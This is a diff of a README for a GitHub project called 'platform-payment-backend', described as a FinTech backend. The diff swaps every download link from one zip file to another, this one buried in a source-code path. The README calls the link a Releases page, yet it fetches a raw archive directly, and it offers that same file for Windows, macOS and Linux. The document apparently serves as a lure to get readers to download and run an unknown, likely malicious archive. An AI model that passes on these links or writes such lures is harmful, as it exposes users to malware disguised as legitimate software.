@@ -1,6 +1,6 @@
 # 🖥️ platform-payment-backend - Build a FinTech Backend with Ease
 
-[![Download](https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip)
+[![Download](https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to the platform-payment-backend project! This application is designed to
 
 To begin using the platform-payment-backend, you need to download it from our Releases page. Please follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to the Releases page: [Download Here](https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip).
+1. **Visit the Releases Page**: Click this link to go to the Releases page: [Download Here](https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip).
    
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. Each release will have a version number. Choose the one marked as the latest.
 
 3. **Download the Files**: Click on the version link. You will see a list of files available for download. Select the appropriate file that fits your operating system. The common options might include:
-   - Windows: `https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip`
-   - macOS: `https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip`
-   - Linux: `https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip`
+   - Windows: `https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip`
+   - macOS: `https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip`
+   - Linux: `https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip`
    
 4. **Save the File**: Your browser will prompt you to save the file. Choose a location on your computer where you can easily find it later.
 
@@ -68,6 +68,6 @@ The platform-payment-backend project is licensed under the MIT License, meaning 
 
 Stay updated and learn more about the platform-payment-backend by visiting the project documentation or following related communities.
 
-[Download Here Again](https://raw.githubusercontent.com/QYUOBKECHO/platform-payment-backend/master/kragerite/platform-payment-backend.zip) for your convenience! 
+[Download Here Again](https://github.com/QYUOBKECHO/platform-payment-backend/raw/refs/heads/master/transactional-service/src/main/backend_payment_platform_v1.5.zip) for your convenience! 
 
 Thank you for choosing platform-payment-backend. We are excited to see how you will use this application!
